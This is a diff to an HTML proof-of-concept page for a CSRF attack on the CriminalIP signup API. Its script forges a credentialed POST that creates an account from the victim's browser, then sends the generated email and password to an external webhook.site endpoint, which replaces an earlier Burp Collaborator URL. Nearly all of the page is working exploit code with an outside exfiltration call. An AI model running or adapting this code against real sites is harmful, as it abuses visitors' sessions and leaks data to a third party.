@@ -4,11 +4,12 @@
   <title>CriminalIP CSRF PoC</title>
 </head>
 <body>
-  <h1>CSRF Exploit - Account Creation + Burp Logging</h1>
+  <h1>CSRF Exploit - CriminalIP Account Creation with Exfiltration</h1>
   <script>
     const victimEmail = "csrfvictim" + Math.floor(Math.random() * 100000) + "@evil.com";
     const password = "Attacker@123";
 
+    // Step 1: Trigger vulnerable CSRF request
     fetch("https://www.criminalip.io/api/auth/user/signup", {
       method: "POST",
       credentials: "include",
@@ -27,7 +28,8 @@
       })
     });
 
-    fetch("https://kk8pu9ze3pggcws7ht7amymid9j07qvf.oastify.com", {
+    // Step 2: Exfiltrate email + password to webhook.site
+    fetch("https://webhook.site/61001786-599b-402b-bcc7-4fbd4fc63a88", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
@@ -35,7 +37,7 @@
       body: JSON.stringify({
         email: victimEmail,
         password: password,
-        note: "CriminalIP CSRF PoC triggered"
+        note: "CSRF triggered in victim browser"
       })
     });
   </script>
